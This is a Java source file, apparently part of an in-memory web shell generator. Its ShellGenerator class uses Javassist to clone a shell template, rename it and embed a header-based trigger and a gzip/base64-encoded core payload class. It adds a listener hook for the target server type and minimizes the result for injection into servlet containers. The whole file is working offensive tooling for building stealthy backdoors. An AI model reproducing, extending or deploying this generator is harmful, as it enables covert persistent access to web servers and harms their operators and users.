package org.leo.jmg.mem.shell;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import org.leo.core.util.asm.ClassFileMinimizer;
import org.leo.jmg.ServletNamespace;
import org.leo.jmg.catalog.InjectorDescriptor;
import org.leo.jmg.generation.GenerationRequest;
import org.leo.jmg.generation.GenerationWorkspace;
import org.leo.jmg.util.base64.Base64Utils;
import org.leo.jmg.util.javassist.JavassistUtil;
import org.leo.jmg.util.response.ResponseUtil;

import java.io.InputStream;

public class ShellGenerator {

    public byte[] makeShell(GenerationRequest request,
                            GenerationWorkspace workspace,
                            InjectorDescriptor descriptor) throws Exception {
        return makeShell(new ShellTemplateContext(
                workspace.getShellClassName(),
                request.getHeaderName(),
                request.getHeaderValue(),
                request.getCoreClassName(),
                workspace.getCoreClassBytes(),
                request.getResponseCode(),
                descriptor.getInjectorName(),
                request.getServerType(),
                request.getEffectiveServletNamespace()),
                descriptor.getShellTemplateName());
    }

    private byte[] makeShell(ShellTemplateContext context,
                             String shellTplName) throws Exception {
        // 每次操作创建完全独立的池（parent=null），避免模板类被 getDefault() 父池缓存后
        // makeClass() 抛出 "is in a parent ClassPool" 错误
        ClassPool pool = new ClassPool(null);
        pool.appendSystemPath();

        // 从模板类字节码克隆出一个新的 CtClass，避免直接修改模板本身
        String classPath = shellTplName.replace('.', '/') + ".class";
        String resourcePath = "shell-template/" + classPath;

        // shell 模板从 resources/shell-template 下读取，避免依赖模板类可被 Class.forName 加载
        try (InputStream is = Thread.currentThread().getContextClassLoader().getResourceAsStream(resourcePath)) {
            if (is == null) {
                throw new RuntimeException("Cannot find shell template class bytes from resource: " + resourcePath
                        + " (shellTplName=" + shellTplName + ")");
            }

            // 保证能够解析依赖类（以当前模块 classpath 为准）
            pool.insertClassPath(new ClassClassPath(ShellGenerator.class));
            CtClass ctClass = pool.makeClass(is);
            try {
                // 改名为用户指定的 Shell 类名
                ctClass.setName(context.shellClassName);
                // 统一降到 Java 5，减小兼容性问题
                ctClass.getClassFile().setVersionToJava5();

                // 用实际配置替换模板中的静态字段
                replaceStaticField(ctClass, "headerName",
                        "private static String headerName = \"" + escapeForJavaString(context.headerName) + "\";");
                replaceStaticField(ctClass, "headerValue",
                        "private static String headerValue = \"" + escapeForJavaString(context.headerValue) + "\";");
                replaceStaticField(ctClass, "coreClassName",
                        "private static String coreClassName = \"" + escapeForJavaString(context.coreClassName) + "\";");
                // coreClass 直接写入字符串，调用方需要保证其内容已经做好压缩/编码
                replaceStaticField(ctClass, "coreClass",
                        "private static String coreClass = \"" + escapeForJavaString(Base64Utils.gzipAndBase64(context.coreClassBytes)) + "\";");
                replaceStaticField(ctClass, "respCode",
                        "private static int respCode = " + context.responseCode + ";");

                if ("ListenerInjector".equals(context.injectorName)) {
                    String methodBody = ResponseUtil.getMethodBody(context.serverType);
                    JavassistUtil.addMethod(ctClass, "getResponseFromRequest", methodBody);
                }

                JavassistUtil.applyServletNamespace(ctClass, context.servletNamespace);

                // 输出并做一次瘦身
                byte[] bytes = ctClass.toBytecode();
                return ClassFileMinimizer.transform(bytes);
            } finally {
                ctClass.detach();
            }
        }
    }

    /**
     * 使用新的定义替换已有静态字段
     */
    private void replaceStaticField(CtClass ctClass, String fieldName, String newFieldSrc) throws Exception {
        try {
            CtField oldField = ctClass.getDeclaredField(fieldName);
            ctClass.removeField(oldField);
        } catch (Exception ignored) {
            // 如果模板里不存在该字段，直接添加即可
        }
        ctClass.addField(CtField.make(newFieldSrc, ctClass));
    }

    /**
     * 将普通字符串转义为可安全写入 Java 字面量的形式
     */
    private String escapeForJavaString(String str) {
        if (str == null) {
            return "";
        }
        return str
                .replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\r", "\\r")
                .replace("\n", "\\n");
    }

    private static final class ShellTemplateContext {
        private final String shellClassName;
        private final String headerName;
        private final String headerValue;
        private final String coreClassName;
        private final byte[] coreClassBytes;
        private final int responseCode;
        private final String injectorName;
        private final String serverType;
        private final ServletNamespace servletNamespace;

        private ShellTemplateContext(String shellClassName,
                                     String headerName,
                                     String headerValue,
                                     String coreClassName,
                                     byte[] coreClassBytes,
                                     int responseCode,
                                     String injectorName,
                                     String serverType,
                                     ServletNamespace servletNamespace) {
            this.shellClassName = shellClassName;
            this.headerName = headerName;
            this.headerValue = headerValue;
            this.coreClassName = coreClassName;
            this.coreClassBytes = coreClassBytes;
            this.responseCode = responseCode;
            this.injectorName = injectorName;
            this.serverType = serverType;
            this.servletNamespace = servletNamespace;
        }
    }
}
